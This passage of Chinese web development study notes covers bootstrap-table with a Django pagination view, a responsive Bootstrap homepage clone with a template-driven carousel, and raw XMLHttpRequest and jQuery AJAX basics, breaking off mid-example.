 rowStyle: function (row, index) { //设置行的特殊样式
                    //这里有5个取值颜色['active', 'success', 'info', 'warning', 'danger'];
                    var strclass = "";
                    if (index == 0) {
                        strclass = "warning";
                    }
                    return { classes: strclass }
                }
```
>[danger] # 前台
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <link rel="stylesheet" href="/static/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="/static/bootstrap/css/bootstrap-table.css">
    <style>
        .concent{
            width: 500px;
            margin: 20px auto;
        }
    </style>
</head>
<body>
    <div class="concent">
        <div id="toolbar" class="btn-group">
            <button id="btn_add" type="button" class="btn btn-default">
                <span class="glyphicon glyphicon-plus" aria-hidden="true"></span>新增
            </button>
            <button id="btn_edit" type="button" class="btn btn-default">
                <span class="glyphicon glyphicon-pencil" aria-hidden="true"></span>修改
            </button>
            <button id="btn_delete" type="button" class="btn btn-default">
                <span class="glyphicon glyphicon-remove" aria-hidden="true"></span>删除
            </button>
        </div>
        <table id="table"></table>
    </div>

</body>
<script src="/static/bootstrap/js/jquery-1.12.4.js"></script>
<script src="/static/bootstrap/js/bootstrap.min.js"></script>
<script src="/static/bootstrap/js/bootstrap-table.js"></script>
<script>
    $(function () {
        InitMainTable();
    });
    var $table;//自动出现滚轮
    function InitMainTable() {
        var queryUrl = '/pertable.html'
        $table = $('#table').bootstrapTable({
            url:queryUrl ,

            method:'GET',
            toolbar: '#toolbar',
            //classes:'table-no-bordered', table 无边界
            striped:true, //是否显示行间隔色
            cache: false, //是否使用缓存，默认为true，所以一般情况下需要设置一下这个属性（*）
            pagination: true,//是否显示分页（*）
            sidePagination:'server',//分页方式：client客户端分页，server服务端分页（*）
            pageNumber:1,    //初始化加载第一页，默认第一页,并记录
            pageSize: 2 ,         //如果设置了分页，页面数据条数。
            pageList :[10, 25, 50, 100],//如果设置了分页，设置可供选择的页面数据条数。设置为 All 或者 Unlimited，则显示所有记录。
            sortable: true, //是否可以排序
            sortOrder:"desc", // 升序还是降序
            sortName:'name',// 根据那个字段
            //sorter:function 自定义一个排序的方法
            showColumns:true,// 可以选择显示列按钮
            minimumCountColumns:2,//和上面的配合显示最少显示的列数
            //checkboxHeader:false, 设置checkbox时是否有全选
            detailView:true, //出现实现每行详情按钮
            detailFormatter:detaRowForma, //和上面配合使用通过自定义函数，展示显示内容
            search: true,//显示搜索框
            strictSearch: true,//设置为 true启用全匹配搜索，否则为模糊搜索
            showRefresh: true,                  //是否显示刷新按钮
            clickToSelect: true,                //是否启用点击选中行, 配合checkbox使用
            //height: 500,                      //行高，如果没有设置height属性，表格自动根据记录条数觉得表格高度
            uniqueId: "id",                     //每一行的唯一标识，一般为主键列
            showToggle: true,                   //是否显示详细视图和列表视图的切换按钮
            {#cardView: false,                    //是否显示详细视图#}
            columns: [
                {
                    checkbox: true,
                    //visible: false   默认true false 不显示checkbox
                }
            ,{
                field: 'id',
                title: '编号',
                editable:true
                //align :'center', 标题和文字都居中
            }, {
                field: 'name',
                title: '名字',
                //halign:'center' 只是标题居中
                formatter:nameFormatter,// 自定义数据显示内容，是一个function，里面有三个参数value当前的后台返回数据，row是每行的对象，index是序列
            }, {
                field: 'age',
                title: '年龄',
                //valign :'left'
                //visible: false true显示该列，false 隐藏不显示
                //switchable:false   showCIolumns 加的时候不在这显示这个列
            }, ],

            queryParams : function (params) {
                    //这里的键的名字和控制器的变量名必须一直，这边改动，控制器也需要改成一样的
                    var temp = {
                        rows: params.limit,                         //页面条数
                        page: (params.offset / params.limit) + 1,   //页码
                        sort: params.sort,      //排序列名
                        sortOrder: params.order, //排位命令（desc，asc）

                        search:params.search//后台查询
                    };
                    return temp;
                },
             onLoadSuccess: function () {
                },
                onLoadError: function () {
                    showTips("数据加载失败！");
                },
            /*
            *   row：点击行的数据，
                $element：tr 元素，
                field：点击列的 field 名称。
            * */
                onDblClickRow: function (row, $element) {
                    var id = row.ID;

                },
             rowStyle: function (row, index) { //设置行的特殊样式
                    //这里有5个取值颜色['active', 'success', 'info', 'warning', 'danger'];
                    var strclass = "";
                    if (index == 0) {
                        strclass = "warning";
                    }
                    return { classes: strclass }
                }
        });
        function nameFormatter (value, row, index) {
            console.log(index)
            return "<a href='mailto:" + value + "' title='单击打开连接'>" + value + "</a>";
        };
        function detaRowForma(index,row) {
            return 111
        }
    }
</script>
</html>
```

>[danger] # 后台-python-django

```
def pertable(request):
    ret={'status':True}
    rows=int(request.GET.get('rows'))
    page =int(request.GET.get('page'))
    startotal= (page-1)*rows
    endtotal=page*rows
    obj = models.person.objects.values('name','age','id')[startotal:endtotal]
    ret['rows']=list(obj)
    ret['total']=3
    # print(request.GET)
    print(ret)
    return HttpResponse(json.dumps(ret))
```
[TOC]
>[success] # 项目文件布局
![](https://box.kancloud.cn/67fbfb3c49dda4c2bf1ce970aebffe24_204x399.png)
```
1 jq 获取宽度一些方法
* width()  内容
* innerWidth() 内容+内边距
* outerWidth() 内容+内边距+边框
* outerWidth(true) 内容+内边距+边框+外边距
```
>[danger] ##### 案例头布局
![](https://box.kancloud.cn/b771e846bbfbabe72c8b89227408b996_1955x151.png)
```
/*======reset css======*/
body{
    font-size: 14px;
    font-family: "Microsoft YaHei",sans-serif;
    color: #333;
}
a{
    text-decoration: none;
    color: #333;
}
a:hover{
    text-decoration: none;
    color: #333;
}
/*自定义字体图标*/
/*1.通过@font-face定义自己的字体*/
@font-face {
    /*2.申明自己的字体名称*/
    font-family: 'wjs';
    /*3.引入字体文件（约束某一段字符代码什么图案）*/
    src:
    url(../fonts/MiFie-Web-Font.svg) format('svg'),
    url(../fonts/MiFie-Web-Font.eot) format('embedded-opentype'),
    url(../fonts/MiFie-Web-Font.ttf) format('truetype'),
    url(../fonts/MiFie-Web-Font.woff) format('woff');
}
/*4.怎么使用维护性更好*/
.wjs_icon{
    font-family: wjs;
}
.wjs_icon_phone::before{
    content: "\e908";
}
.wjs_icon_tel::before{
    content: "\e909";
}


/*======modal css======*/
.wjs_topBar{
    border-bottom: 1px solid #ccc;
    font-size: 12px;
    color: #666;
}
.wjs_topBar > .container{}
.wjs_topBar > .container > .row{}
/*.wjs_topBar > .container > .row > div{
    height: 40px;
    border-left: 1px solid #ccc;
}
.wjs_topBar > .container > .row > div:first-child{
    border-left: none;
}*/
/*  +,~选择器   + 紧邻的下一个兄弟元素  ~ 后面所有的兄弟元素*/
.wjs_topBar > .container > .row > div{
    height: 40px;
    line-height: 40px;
    text-align: center;
}
.wjs_topBar > .container > .row > div ~ div{
    border-left: 1px solid #ccc;
}

.wjs_topBar .btn-register{
    border: none;
    background: #e92322;
    color: #fff;
    font-size: 12px;
    padding: 3px 12px;
}
.wjs_topBar .btn-register:hover{

}
.wjs_topBar .btn-login{
    font-size: 12px;
    color: #666;
}
.wjs_topBar .btn-login:hover{
    text-decoration: none;
    color: #666;
}

.wjs_app{
    display: block;
}
.wjs_app img{
    display: none;
}
.wjs_app:hover img{
    display: block;
    position: absolute;
    /*移动居中 用left 配合移动图片 margin-left 距离*/
    left: 50%;
    margin-left:-60px;
    border: 1px solid #ccc;
    border-top: none;
    top:40px;
}
```
* html
```
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=0">
    <title>微金所</title>
    <link href="lib/bootstrap/css/bootstrap.css" rel="stylesheet">
    <!--[if lt IE 9]>
    <script src="lib/html5shiv/html5shiv.min.js"></script>
    <script src="lib/respond/respond.min.js"></script>
    <![endif]-->
    <link rel="stylesheet" href="css/index.css">
</head>
<body>
<!--顶部通栏-->
<header class="wjs_topBar hidden-sm hidden-xs">
    <div class="container">
        <div class="row">
            <div class="col-md-2">
                <a href="#" class="wjs_app">
                    <span class="wjs_icon wjs_icon_phone"></span>
                    <span>手机微金所</span>
                    <span class="glyphicon glyphicon-menu-down"></span>
                    <img src="images/code.jpg" alt="">
                </a>
            </div>
            <div class="col-md-5">
                <span class="wjs_icon wjs_icon_tel"></span>
                <span> 4006-89-4006（服务时间：9:00-21:00）</span>
            </div>
            <div class="col-md-2">
                <a href="#">常见问题</a>
                <a href="#">财富登录</a>
            </div>
            <div class="col-md-3">
                <a href="#" class="btn btn-default btn-register">免费注册</a>
                <a href="#" class="btn btn-link btn-login">登录</a>
            </div>
        </div>
    </div>
</header>
<!--导航栏-->
<nav class="wjs_nav"></nav>
<!--轮播图-->
<section class="wjs_banner"></section>
<!--信息-->
<section class="wjs_info"></section>
<!--预约-->
<section class="wjs_book"></section>
<!--产品-->
<section class="wjs_product"></section>
<!--新闻-->
<section class="wjs_news"></section>
<!--合作伙伴-->
<footer class="wjs_partner"></footer>
<script src="lib/jquery/jquery.min.js"></script>
<script src="lib/bootstrap/js/bootstrap.min.js"></script>
<script src="js/index.js"></script>
</body>
</html>
```
>[danger] ##### 导航案例
![](https://box.kancloud.cn/62fa4641dc8c41b1d5ac50abd87170ff_1878x109.png)
```
1.找到源码中样式位置，进行复制后到自己编写的css样式中进行覆盖编写
2..拷贝源码的模块样式：准确定位到所有元素的选择器并且能保证优先级比源码高
3.针对功能进行覆盖：更改模块名称
4.但是有一些没有用到的选择器 代码的冗余
5. 删除：降低代码量 
6. 保留：利于维护，方便产品跟新的时候不用再去修改代码 
```
```
<!--找到navbar-default 对样式进行修改,把样式追加到wjs_nav-->
<nav class="navbar wjs_nav">
    <div class="container">
        <div class="navbar-header">
            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a class="navbar-brand" href="#">
                <span class="wjs_icon wjs_icon_logo"></span>
                <span class="wjs_icon wjs_icon_name"></span>
            </a>
        </div>
        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
            <ul class="nav navbar-nav">
                <li class="active"><a href="#">我要投资</a></li>
                <li><a href="#">我要借贷</a></li>
                <li><a href="#">平台介绍</a></li>
                <li><a href="#">新手专区</a></li>
                <li><a href="#">最新动态</a></li>
                <li><a href="#">微平台</a></li>
            </ul>
            <ul class="nav navbar-nav navbar-right hidden-sm">
                <li><a href="#">个人中心</a></li>
            </ul>
        </div>
    </div>
</nav>
```
* css 都是源码样式重新更改命名
```
.wjs_nav {
    margin-bottom: 0;
    border: none;
    border-bottom: 1px solid #ccc;
}
.wjs_nav .wjs_icon_logo{
    font-size: 50px;
    color: #e92322;
    vertical-align: middle;
}
.wjs_nav .wjs_icon_name{
    font-size: 36px;
    color: #333;
    vertical-align: middle;
}

.wjs_nav .navbar-brand {
    color: #777;
    height: 80px;
    line-height: 50px;
}
.wjs_nav .navbar-brand:hover,
.wjs_nav .navbar-brand:focus {
    color: #5e5e5e;
    background-color: transparent;
}
.wjs_nav .navbar-text {
    color: #777;
}
.wjs_nav .navbar-nav > li > a {
    color: #777;
    height: 80px;
    line-height: 50px;
}
.wjs_nav .navbar-nav > li > a:hover,
.wjs_nav .navbar-nav > li > a:focus {
    color: #777;
    background-color: transparent;
    border-bottom: 3px solid #e92322;
}
.wjs_nav .navbar-nav > .active > a,
.wjs_nav .navbar-nav > .active > a:hover,
.wjs_nav .navbar-nav > .active > a:focus {
    color: #555;
    border-bottom: 3px solid #e92322;
}
.wjs_nav .navbar-nav > .disabled > a,
.wjs_nav .navbar-nav > .disabled > a:hover,
.wjs_nav .navbar-nav > .disabled > a:focus {
    color: #ccc;
    background-color: transparent;
}
.wjs_nav .navbar-toggle {
    border-color: #ddd;
    margin-top: 23px;
}
.wjs_nav .navbar-toggle:hover,
.wjs_nav .navbar-toggle:focus {
    background-color: #ddd;
}
.wjs_nav .navbar-toggle .icon-bar {
    background-color: #888;
}
.wjs_nav .navbar-collapse,
.wjs_nav .navbar-form {
    border-color: #e7e7e7;
}
.wjs_nav .navbar-nav > .open > a,
.wjs_nav .navbar-nav > .open > a:hover,
.wjs_nav .navbar-nav > .open > a:focus {
    color: #555;
    background-color: #e7e7e7;
}
@media (max-width: 767px) {
    .wjs_nav .navbar-nav .open .dropdown-menu > li > a {
        color: #777;
    }
    .wjs_nav .navbar-nav .open .dropdown-menu > li > a:hover,
    .wjs_nav .navbar-nav .open .dropdown-menu > li > a:focus {
        color: #333;
        background-color: transparent;
    }
    .wjs_nav .navbar-nav .open .dropdown-menu > .active > a,
    .wjs_nav .navbar-nav .open .dropdown-menu > .active > a:hover,
    .wjs_nav .navbar-nav .open .dropdown-menu > .active > a:focus {
        color: #555;
        background-color: #e7e7e7;
    }
    .wjs_nav .navbar-nav .open .dropdown-menu > .disabled > a,
    .wjs_nav .navbar-nav .open .dropdown-menu > .disabled > a:hover,
    .wjs_nav .navbar-nav .open .dropdown-menu > .disabled > a:focus {
        color: #ccc;
        background-color: transparent;
    }
}
.wjs_nav .navbar-link {
    color: #777;
}
.wjs_nav .navbar-link:hover {
    color: #333;
}
.wjs_nav .btn-link {
    color: #777;
}
.wjs_nav .btn-link:hover,
.wjs_nav .btn-link:focus {
    color: #333;
}
.wjs_nav .btn-link[disabled]:hover,
fieldset[disabled] .wjs_nav .btn-link:hover,
.wjs_nav .btn-link[disabled]:focus,
fieldset[disabled] .wjs_nav .btn-link:focus {
    color: #ccc;
}

```

>[danger] ##### 轮播图 重点，ajax回调函数思路
![](https://box.kancloud.cn/5503bd900c78bb07521ad5cd5b0fa3f0_1407x416.png)
```
1.对数据进行缓存，因为改变页面的时候会重新请求ajax服务器端，所以可以对数据进行储存
2.success 成功的时候利用回调函数进行内部封装
3.移动端首饰滑动图片 在jquery 处理方法详见js 第四步，其中切换用的是bootstrap的api，中可以调快轮播速度
4.手机端和pc 轮播图片大小有区别的
```
```
$(function () {
    /*动态轮播图*/
    banner();
});
var banner = function () {
    /*1.获取轮播图数据    ajax */
    /*2.根据数据动态渲染  根据当前设备  屏幕宽度判断 */
    /*2.1 准备数据*/
    /*2.2 把数据转换成html格式的字符串 （动态创建元素，字符串拼接，模版引擎【artTemplate】*/
    /*2.3 把字符渲染页面当中*/
    /*3.测试功能 页面尺寸发生改变重新渲染*/
    /*4.移动端手势切换  touch*/

    /*ui框架：bootstrap,妹子UI,jqueryUI,easyUI,jqueryMobile,mui,framework7*/
    /*关于移动端的UI框架：bootstrap,jqueryMobile,mui,framework7*/
    /*模板引擎：artTemplate,handlebars,mustache,baiduTemplate,velocity,underscore*/

    /*做数据缓存*/
    var getData = function (callback) {
        /*缓存了数据*/
        if(window.data){
            callback && callback(window.data);
        }else {
            /*1.获取轮播图数据*/
            $.ajax({
                type:'get',
                url:'js/data.json',
                /*强制转换后台返回的数据为json对象*/
                /*强制转换不成功程序报错，不会执行success,执行error回调*/
                dataType:'json',
                data:'',
                success:function (data) {
                    window.data = data;
                    callback && callback(window.data);
                }
            });
        }
    }
    var render = function () {
        getData(function (data) {
            /*2.根据数据动态渲染  根据当前设备  屏幕宽度判断 */
            var isMobile = $(window).width() < 768 ? true : false;
            //console.log(isMobile);
            /*2.1 准备数据*/
            /*2.2 把数据转换成html格式的字符串*/
            /*使用模版引擎：那些html静态内容需要编程动态的*/
            /*发现：点容器  图片容器  新建模版*/
            /*开始使用*/
            /*<% console.log(list); %> 模版引擎内不可使用外部变量 */
            var pointHtml = template('pointTemplate',{list:data});
            //console.log(pointHtml);
            var imageHtml = template('imageTemplate',{list:data,isMobile:isMobile});
            //console.log(imageHtml);
            /*2.3 把字符渲染页面当中*/
            $('.carousel-indicators').html(pointHtml);
            $('.carousel-inner').html(imageHtml);
        });
    }
    /*3.测试功能 页面尺寸发生改变事件，动态更改*/
    $(window).on('resize',function () {
        render();
        /*通过js主动触发某个事件*/
    }).trigger('resize');
    
    
     /*4.移动端手势切换*/
    var startX = 0;
    var distanceX = 0;
    var isMove = false;
    /*originalEvent 代表js原生事件*/
    $('.wjs_banner').on('touchstart',function (e) {
        startX = e.originalEvent.touches[0].clientX;
    }).on('touchmove',function (e) {
        var moveX = e.originalEvent.touches[0].clientX;
        distanceX = moveX - startX;
        isMove = true;
    }).on('touchend',function (e) {
        /*距离足够 50px 一定要滑动过*/
        if(isMove && Math.abs(distanceX) > 50){
            /*手势*/
            /*左滑手势*/
            if(distanceX < 0){
                //console.log('next');
                $('.carousel').carousel('next');
            }
            /*右滑手势*/
            else {
                //console.log('prev');
                $('.carousel').carousel('prev');
            }
        }
        startX = 0;
        distanceX = 0;
        isMove = false;
    });

}
```
* 使用轮播图模板引擎
```
<!--轮播图-->
<section class="wjs_banner">
    <div id="carousel-example-generic" class="carousel slide" data-ride="carousel" >
        <ol class="carousel-indicators">

        </ol>
        <div class="carousel-inner">

        </div>
        <a class="left carousel-control" href="#carousel-example-generic"  data-slide="prev">
            <span class="glyphicon glyphicon-chevron-left"></span>
        </a>
        <a class="right carousel-control" href="#carousel-example-generic" data-slide="next">
            <span class="glyphicon glyphicon-chevron-right"></span>
        </a>
    </div>
</section>

<!--使用模版引擎-->
<script type="text/template" id="pointTemplate">
    <% for(var i = 0 ; i < list.length ; i ++){ %>
        <li data-target="#carousel-example-generic" data-slide-to="<%=i%>" class="<%=i==0?'active':''%>"></li>
    <% } %>
</script>
<script type="text/template" id="imageTemplate">
    <% for(var i = 0 ; i < list.length ; i ++){ %>
    <div class="item <%=i==0?'active':''%>">
        <% if(isMobile){ %>
        <a href="#" class="m_imgBox"><img src="<%=list[i].mUrl%>" alt=""></a>
        <% }else{ %>
        <a href="#" class="pc_imgBox" style="background-image: url(<%=list[i].pcUrl%>)"></a>
        <% } %>
    </div>
    <% } %>
</script>
<script src="lib/jquery/jquery.min.js"></script>
<script src="lib/bootstrap/js/bootstrap.min.js"></script>
<script src="lib/artTemplate/template-native.js"></script>
<script src="js/index.js"></script>
```
>[danger] ##### 其他样式
![](https://box.kancloud.cn/b14065a72f3da4fb447054306614d464_963x272.png)
```
1.自定义 媒体缩放大小
```
```
<section class="wjs_info hidden-xs">
    <div class="container">
        <div class="col-sm-6 col-md-4">
            <a href="#">
                <div class="media">
                    <div class="media-left"><span class="wjs_icon wjs_icon_dollar"></span></div>
                    <div class="media-body">
                        <h4 class="media-heading">支付交易保障</h4>
                        <p>银联支付全称保证支付安全</p>
                    </div>
                </div>
            </a>
        </div>
        <div class="col-sm-6 col-md-4">
            <a href="#">
                <div class="media">
                    <div class="media-left"><span class="wjs_icon wjs_icon_dollar"></span></div>
                    <div class="media-body">
                        <h4 class="media-heading">支付交易保障</h4>
                        <p>银联支付全称保证支付安全</p>
                    </div>
                </div>
            </a>
        </div>
        <div class="col-sm-6 col-md-4">
            <a href="#">
                <div class="media">
                    <div class="media-left"><span class="wjs_icon wjs_icon_dollar"></span></div>
                    <div class="media-body">
                        <h4 class="media-heading">支付交易保障</h4>
                        <p>银联支付全称保证支付安全</p>
                    </div>
                </div>
            </a>
        </div>
        <div class="col-sm-6 col-md-4">
            <a href="#">
                <div class="media">
                    <div class="media-left"><span class="wjs_icon wjs_icon_dollar"></span></div>
                    <div class="media-body">
                        <h4 class="media-heading">支付交易保障</h4>
                        <p>银联支付全称保证支付安全</p>
                    </div>
                </div>
            </a>
        </div>
        <div class="col-sm-6 col-md-4">
            <a href="#">
                <div class="media">
                    <div class="media-left"><span class="wjs_icon wjs_icon_dollar"></span></div>
                    <div class="media-body">
                        <h4 class="media-heading">支付交易保障</h4>
                        <p>银联支付全称保证支付安全</p>
                    </div>
                </div>
            </a>
        </div>
        <div class="col-sm-6 col-md-4">
            <a href="#">
                <div class="media">
                    <div class="media-left"><span class="wjs_icon wjs_icon_dollar"></span></div>
                    <div class="media-body">
                        <h4 class="media-heading">支付交易保障</h4>
                        <p>银联支付全称保证支付安全</p>
                    </div>
                </div>
            </a>
        </div>
    </div>
</section>
<!--预约-->
<section class="wjs_book">
    <div class="container">
        <div class="pull-left">
            <span class="wjs_icon wjs_icon_clock"></span>
            现在有 273 人在排队，累计预约交易成功 7571 次。 什么是预约投标？
            <a class="book" href="#">立即预约</a>
        </div>
        <div class="pull-right hidden-xs">
            <a class="video" href="#"><span class="wjs_icon wjs_icon_video"></span> 微金所企业宣传片</a>
        </div>
    </div>
</section>
```
```
/*信息*/
.wjs_info{
    border-bottom: 1px solid #ccc;
    padding: 15px 0;
}
.wjs_info > .container{
    width: 900px;
}
/*在小屏设备的时候  容器的宽750px*/
/*如果不满足需求需要自己使用媒体查询*/
@media (min-width: 768px) and (max-width: 992px) {
    .wjs_info > .container{
        width: 750px;
    }
}
.wjs_info > .container > div > a{
    display: block;
    padding: 15px 0;
}
.wjs_info > .container > div > a:hover{
    color: #e92322;
}
.wjs_info > .container > div > a .wjs_icon_dollar{
    font-size: 30px;
}

/*预约模块*/
.wjs_book{
    padding: 40px 0;
    border-bottom: 1px solid #ccc;
}
.wjs_book > .container{
    width: 900px;
}
@media (min-width: 768px) and (max-width: 992px) {
    .wjs_book > .container{
        width: 750px;
    }
}
@media (max-width: 768px) {
    .wjs_book > .container{
        width: 100%;
    }
}
.wjs_book .book{
    color: #e92322;
    border-bottom: 1px dashed #e92322;
}
.wjs_book .video:hover{
    color: #e92322;
}
.wjs_book .wjs_icon{
    font-size: 20px;
}

```

>[danger] ##### 滑动标题栏
![](https://box.kancloud.cn/7f77b00d9480850279eabe58d541b848_734x80.png)
```
1.用一个固定100%的容器去嵌套一个ul长度为li总和
2.使用滑动插件，进行滑动设置
```
![](https://box.kancloud.cn/aa4ce0a209d2deb9327f5c9701e50337_551x132.png)
```
1.css文件的更改使用的 是加前缀的方法更改
```
```
.wjs_product{
    padding: 20px 0;
    background: #f5f5f5;
    border-bottom: 1px solid #ccc;
}
.wjs_product .nav-tabs-parent{
    width: 100%;
    overflow: hidden;
}
.wjs_product .nav-tabs {
    border-bottom: 1px solid #ddd;
}
.wjs_product .nav-tabs > li {
    float: left;
    margin-bottom: 0;
    margin-left:15px;
}
.wjs_product .nav-tabs > li > a {
    margin-right: 2px;
    line-height: 1.42857143;
    border: none;
    border-radius: 4px 4px 0 0;
}
.wjs_product .nav-tabs > li > a:hover {
    background: #f5f5f5;
}
.wjs_product .nav-tabs > li.active > a,
.wjs_product .nav-tabs > li.active > a:hover,
.wjs_product .nav-tabs > li.active > a:focus {
    color: #555;
    cursor: default;
    background-color: #f5f5f5;
    border: none;
    border-bottom: 3px solid #e92322;
}
.wjs_product .nav-tabs.nav-justified {
    width: 100%;
    border-bottom: 0;
}
.wjs_product .nav-tabs.nav-justified > li {
    float: none;
}
.wjs_product .nav-tabs.nav-justified > li > a {
    margin-bottom: 5px;
    text-align: center;
}
.wjs_product .nav-tabs.nav-justified > .dropdown .dropdown-menu {
    top: auto;
    left: auto;
}
@media (min-width: 768px) {
    .wjs_product .nav-tabs.nav-justified > li {
        display: table-cell;
        width: 1%;
    }
    .wjs_product .nav-tabs.nav-justified > li > a {
        margin-bottom: 0;
    }
}
.wjs_product .nav-tabs.nav-justified > li > a {
    margin-right: 0;
    border-radius: 4px;
}
.wjs_product .nav-tabs.nav-justified > .active > a,
.wjs_product .nav-tabs.nav-justified > .active > a:hover,
.wjs_product .nav-tabs.nav-justified > .active > a:focus {
    border: 1px solid #ddd;
}
@media (min-width: 768px) {
    .wjs_product .nav-tabs.nav-justified > li > a {
        border-bottom: 1px solid #ddd;
        border-radius: 4px 4px 0 0;
    }
    .wjs_product .nav-tabs.nav-justified > .active > a,
    .wjs_product .nav-tabs.nav-justified > .active > a:hover,
    .wjs_product .nav-tabs.nav-justified > .active > a:focus {
        border-bottom-color: #fff;
    }
}
```
```
<section class="wjs_product">
    <div class="container">
        <!--页签-->
        <div class="nav-tabs-parent">
            <ul class="nav nav-tabs">
                <li class="active"><a href="#product_nav01" data-toggle="tab">特别推荐</a></li>
                <li><a href="#product_nav02" data-toggle="tab">微平台</a></li>
                <li><a href="#product_nav03" data-toggle="tab">微平台</a></li>
                <li><a href="#product_nav04" data-toggle="tab">微平台</a></li>
                <li><a href="#product_nav05" data-toggle="tab">微平台</a></li>
                <li><a href="#product_nav06" data-toggle="tab">微平台</a></li>
                <li><a href="#product_nav07" data-toggle="tab">微平台</a></li>
            </ul>
        </div>
        <!--内容-->
        <div class="tab-content">
            <div class="tab-pane active" id="product_nav01"> 
            </div>
            <div class="tab-pane" id="product_nav02">2</div>
            <div class="tab-pane" id="product_nav03">3</div>
            <div class="tab-pane" id="product_nav04">4</div>
            <div class="tab-pane" id="product_nav05">5</div>
            <div class="tab-pane" id="product_nav06">6</div>
            <div class="tab-pane" id="product_nav07">7</div>
        </div>
    </div>
</section>
```
```
$(function () {
    /*动态轮播图*/
    banner();
    /*移动端页签*/
    initMobileTab();
    /*初始工具提示*/
    $('[data-toggle="tooltip"]').tooltip();
});
var initMobileTab = function () {
    /*1.解决换行问题*/
    var $navTabs = $('.wjs_product .nav-tabs');
    var width = 0;
    $navTabs.find('li').each(function (i, item) {
        var $currLi = $(this);//$(item);
        /*
        * width()  内容
        * innerWidth() 内容+内边距
        * outerWidth() 内容+内边距+边框
        * outerWidth(true) 内容+内边距+边框+外边距
        * */
        var liWidth = $currLi.outerWidth(true);
        width += liWidth;
    });
    console.log(width);
    $navTabs.width(width);

    /*2.修改结构使之区域滑动的结构*/
    //加一个父容器给 .nav-tabs 叫  .nav-tabs-parent

    /*3.自己实现滑动效果 或者 使用iscroll */
    new IScroll($('.nav-tabs-parent')[0],{
        scrollX:true,
        scrollY:false,
        click:true
    });
}

```
>[success] # js原始的ajax
```
1.Ajax 即“Asynchronous Javascript And XML”（异步 JavaScript 和 XML），是指一种创建交互式网页应用的网页开发
技术。Ajax = 异步 JavaScript 和 XML（标准通用标记语言的子集）。
```
>[danger] ##### 原始的ajax 四种状态
```
 var xhr = new XMLHttpRequest()
    console.log(xhr.readyState)
    // => 0
    // 初始化 请求代理对象

    xhr.open('GET', 'time.php')
    console.log(xhr.readyState)
    // => 1
    // open 方法已经调用，建立一个与服务端特定端口的连接

    xhr.send()

    xhr.addEventListener('readystatechange', function () {
      switch (this.readyState) {
        case 2:
          // => 2
          // 已经接受到了响应报文的响应头

          // 可以拿到头
          // console.log(this.getAllResponseHeaders())
          console.log(this.getResponseHeader('server'))
          // 但是还没有拿到体
          console.log(this.responseText)
          break

        case 3:
          // => 3
          // 正在下载响应报文的响应体，有可能响应体为空，也有可能不完整
          // 在这里处理响应体不保险（不可靠）
          console.log(this.responseText)
          break

        case 4:
          // => 4
          // 一切 OK （整个响应报文已经完整下载下来了）
          console.log(this.responseText)
          break
      }
    })
```

>[danger] ##### 原始的写法 GET 请求
```
var xhr = new XMLHttpRequest()

// 如果需要补货第一个状态的变化，需要注意代码执行顺序的问题（不要出现来不及的情况）
// 指定请求，和网址
xhr.open('GET', './time.php')
// 发送请求
xhr.send()
// 因为客户端永远不知道服务端何时才能返回我们需要的响应
// 所以 AJAX API 采用事件的机制（通知的感觉）
xhr.onreadystatechange = function () {
  // 这个事件并不是只在响应时触发，XHR 状态改变就触发，当状态为4的时候获对应服务器的响应
  // console.log(1)
  if (this.readyState !== 4) return
  // 获取响应的内容（响应体）获取服务端内容
  console.log(this.responseText)
}
```
>[danger] ##### post 请求写法
```
var xhr = new XMLHttpRequest()

xhr.open('POST', '/add.php') // 设置请求行

xhr.setRequestHeader('Foo', 'Bar') // 设置一个请求头
// 一旦你的请求体是 urlencoded 格式的内容，一定要设置请求头中 Content-Type 'application/x-www-form-urlencoded'
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded')

xhr.send('key1=value1&key2=value2') // 以 urlencoded 格式设置请求体
 xhr.onreadystatechange = function () {
if (this.readyState !== 4) return
console.log(this.responseText)
  }
```
>[danger] ##### 同步和异步请求
```

    // console.time('abc')
    // for (var i = 0; i < 100000000; i++) {}
    // console.timeEnd('abc')

    // console.log('begin request')
    var xhrAsync = new XMLHttpRequest()
    // open 方法的第三个参数是 async 可以传入一个布尔值，默认为 true
    xhrAsync.open('GET', 'time.php', true)
    console.time('async')
    xhrAsync.send()
    console.log(xhrAsync.responseText)
    // console.log('end request')
    console.timeEnd('async')

    // 同步模式 ajax 操作会有楞等的情况
    // 区别在于 send 方法会不会出现等待情况
    // console.log('begin request')
    var xhrSync = new XMLHttpRequest()
    // open 方法的第三个参数是 async 可以传入一个布尔值，默认为 true
    xhrSync.open('GET', 'time.php', false)
    console.time('sync')
    xhrSync.send()
    console.log(xhrSync.responseText)
    // console.log('end request')
    console.timeEnd('sync')

```
>[danger] ##### 回调函数式的封装
```
 function ajax (method, url, params, done) {
      method = method.toUpperCase()
      var xhr = new XMLHttpRequest()

      if (typeof params === 'object') {
        var tempArr = []
        for (var key in params) {
          var value = params[key]
          tempArr.push(key + '=' + value)
        }
        params = tempArr.join('&')
      }

      if (method === 'GET') {
        url += '?' + params
      }

      xhr.open(method, url)

      var data = null
      if (method === 'POST') {
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded')
        data = params
      }
      
      xhr.send(data)

      xhr.onreadystatechange = function () {
        if (this.readyState !== 4) return
        // 不应该在封装的函数中主观的处理响应结果
        // console.log(this.responseText)
        // 你说我太主观，那么你告诉我应该做什么
        done(this.responseText)
      }

    }
```
>[success] # jq-- ajax 使用
```
1.dataType 设置相应头，正常来说服务器端应该加上对应的相应，如果一旦设置即时传输的xml格式也认
为是json
```
```
$.ajax({
  url: 'json.php',
  type: 'get',
  // 设置的是请求参数
  data: { id: 1, name: '张三' },
  // 用于设置响应体的类型 注意 跟 data 参数没关系！！！
  dataType: 'json',
  success: function (res) {
    // 一旦设置的 dataType 选项，就不再关心 服务端 响应的 Content-Type 了
    // 客户端会主观认为服务端返回的就是 JSON 格式的字符串
    console.log(res)
  }
})
```
>[danger] ##### 常见的几种回调
```
$.ajax({
